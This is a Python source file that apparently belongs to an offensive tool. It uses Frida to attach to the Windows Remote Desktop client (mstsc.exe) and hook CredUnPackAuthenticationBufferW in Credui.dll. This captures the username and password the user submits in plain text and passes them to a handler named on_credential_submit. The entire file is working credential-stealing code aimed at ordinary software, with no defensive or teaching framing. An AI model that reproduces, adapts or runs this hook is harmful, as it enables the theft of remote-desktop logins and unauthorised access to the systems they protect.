import frida
from PyHook import wait_for_process, on_credential_submit, log


hook_process_name = "rdp"


def logger(message):
    log(hook_process_name, message)


def wait_for():
    wait_for_process(["mstsc.exe"], hook)


def hook(pid):
    try:
        logger("Trying To Hook Into RDP")
        session = frida.attach(pid)
        logger(f"Hooked RDP With PID {pid}")

        # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
        script = session.create_script("""

        var username;
        var password;
        var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

        Interceptor.attach(CredUnPackAuthenticationBufferW, {
            onEnter: function (args) 
            {

                username = args[3];
                password = args[7];
            },
            onLeave: function (result)
            {

                var user = username.readUtf16String()
                var pass = password.readUtf16String()

                if (user && pass)
                {
                   send("\\n=============================" + "\\n[+] Intercepted Creds from RDP" + "\\nUsername    : " + user + "\\nPassword    : " + pass +"\\n=============================" );
                }
            }
        });

        """)
        script.on('message', on_credential_submit)
        script.load()

    except Exception as e:
        logger("Unhandled exception: " + str(e))
        logger("Continuing...")
